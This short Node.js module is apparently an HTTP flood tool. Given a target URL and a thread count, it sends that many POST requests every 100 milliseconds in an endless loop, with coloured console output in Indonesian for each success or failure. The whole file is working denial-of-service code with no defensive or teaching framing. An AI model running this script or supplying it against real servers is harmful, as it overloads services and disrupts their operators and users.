const axios = require('axios');
const chalk = require('chalk');

module.exports = function(target, threads) {
  setInterval(() => {
    for (let i = 0; i < threads; i++) {
      axios.post(target, { data: 'roox-spam-test' })
        .then(() => console.log(chalk.magenta(`[✓] POST sukses`)))
        .catch(() => console.log(chalk.red(`[x] POST gagal`)));
    }
  }, 100);
};